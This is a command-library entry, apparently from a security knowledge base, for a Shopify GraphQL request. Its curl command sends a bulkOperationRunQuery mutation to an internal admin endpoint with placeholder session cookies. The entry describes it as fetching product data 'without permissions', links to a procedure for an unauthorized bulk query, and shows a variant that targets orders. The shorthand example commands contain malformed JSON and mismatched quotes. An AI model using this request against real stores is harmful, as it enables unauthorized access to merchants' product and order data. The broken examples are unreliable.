---
id: cmd-uuid-2
data: >-
  curl -X POST
  'https://yourstore.myshopify.com/admin/internal/web/graphql/core?operation=LoginNotificationsRead'
  -H 'Content-Type: application/json' -H 'Cookie: _shopify_s=session;
  _shopify_y=session' -d '{"query":"mutation { bulkOperationRunQuery( query:
  \\"{\\n products {\\n edges {\\n node {\\n id\\n title\\n }\\n }\\n
  }\\n}\\n\\" ) { bulkOperation { id status } userErrors { field message } }
  }","variables":null,"operationName":null}'
tags:
  - graphql
  - bulk-operations
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.520Z'
verified: false
validated: true
submitted: true
---
# shopify-graphql-bulkoperationrunquery

## Command

```bash
curl -X POST 'https://yourstore.myshopify.com/admin/internal/web/graphql/core?operation=LoginNotificationsRead' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: _shopify_s=session; _shopify_y=session' \
  -d '{"query":"mutation { bulkOperationRunQuery( query: \\"{\\n products {\\n edges {\\n node {\\n id\\n title\\n }\\n }\\n }\\n}\\n\\" ) { bulkOperation { id status } userErrors { field message } } }","variables":null,"operationName":null}'
```

## Description

GraphQL mutation to run a bulk query on products, fetching IDs and titles without permissions in Shopify API.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `query` | GraphQL query string (e.g., products edges node id title) | Yes |
| `Cookie` | Authentication session | Yes |

## Examples

### Basic Usage

```bash
curl -X POST ... -d '{query: "mutation { bulkOperationRunQuery ... }"}'
```

### Advanced Usage

```bash
# Query for other data like orders
curl ... -d '{query: "mutation { bulkOperationRunQuery( query: \"orders { edges { node { id } } }\" ) ... }'}'
```

## Expected Output

JSON: {"data":{"bulkOperationRunQuery":{"bulkOperation":{"id":"gid://...","status":"RUNNING"},"userErrors":[]}}}

## Related

- [[procedures/Execute-Unauthorized-Bulk-Operation-Query-on-Products]]
